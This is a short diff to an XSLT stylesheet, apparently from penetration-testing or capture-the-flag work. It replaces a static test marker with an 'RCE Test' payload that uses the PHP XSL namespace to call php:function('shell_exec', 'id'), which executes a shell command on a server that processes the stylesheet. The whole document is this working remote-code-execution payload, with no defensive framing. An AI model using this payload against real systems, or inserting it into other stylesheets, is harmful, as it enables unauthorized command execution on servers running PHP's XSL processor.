@@ -1,11 +1,15 @@
 <?xml version="1.0"?>
 <xsl:stylesheet version="1.0"
-  xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:php="http://php.net/xsl">
 
   <xsl:template match="*">
     <html>
       <body>
-        <pre>STATIC PAYLOAD WORKS ✅</pre>
+        <h2>RCE Test</h2>
+        <pre>
+          <xsl:value-of select="php:function('shell_exec', 'id')" />
+        </pre>
       </body>
     </html>
   </xsl:template>
